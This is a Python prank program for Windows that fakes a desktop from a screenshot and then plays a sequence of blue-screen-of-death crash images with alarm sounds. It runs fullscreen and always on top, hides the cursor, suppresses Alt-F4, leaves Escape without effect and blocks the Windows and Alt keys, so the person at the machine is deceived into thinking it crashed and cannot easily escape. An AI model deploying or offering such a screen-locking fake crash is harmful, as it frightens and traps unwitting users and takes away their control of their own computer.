import tkinter as tk
import time
import pyautogui
import os, sys
import keyboard
from PIL import Image, ImageTk
import winsound

time.sleep(5)

ISRUN = False

dir = os.path.dirname(os.path.abspath(sys.argv[0]))
print(dir)

pyautogui.hotkey("win", "d")
time.sleep(0.7)
im = pyautogui.screenshot('desktop.png')

window = tk.Tk()

window.geometry("{}x{}+0+0".format(window.winfo_screenwidth(), format(window.winfo_screenheight())))

bg = tk.PhotoImage(file="desktop.png")
bgimage = tk.Label(window, image=bg, width=window.winfo_screenwidth(), height=window.winfo_screenheight(), borderwidth=0)
bgimage.place(x=0, y=0)

def updateimg(number,sleepnum):
    imgName = dir+"/BSOD/bsod" + str(number) + ".png"
    img = Image.open(imgName).resize((window.winfo_screenwidth(),window.winfo_screenheight()), Image.LANCZOS)
    bg1 = ImageTk.PhotoImage(img)
    bgimage.configure(image=bg1, cursor='none')
    bgimage.image = bg1
    window.update()
    time.sleep(sleepnum)

def start(e):
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        time.sleep(1)
        updateimg(1,3)
        updateimg(3,2)
        updateimg(2,3)
        updateimg(4,4)
        winsound.PlaySound(dir+'/noise2.wav', winsound.SND_ASYNC)
        updateimg(5,2)
        updateimg(3,3)
        winsound.PlaySound(dir + '/noise3.wav', winsound.SND_ASYNC)
        updateimg(5,0.5)
        updateimg(2,1)
        updateimg(4,0.7)
        updateimg(6,5)
        winsound.PlaySound(dir + '/final.wav',winsound.SND_LOOP + winsound.SND_ASYNC)

def toggle():
    pass

def disable_alt_f4(event):
    return "break"

bgimage.bind('<Button-1>', start)
window.attributes("-fullscreen", True)
window.bind('<Escape>',toggle)
window.bind('<Alt-F4>', disable_alt_f4)
window.attributes('-topmost',True)
window.update()
keyboard.block_key('win')
keyboard.block_key('alt')


window.mainloop()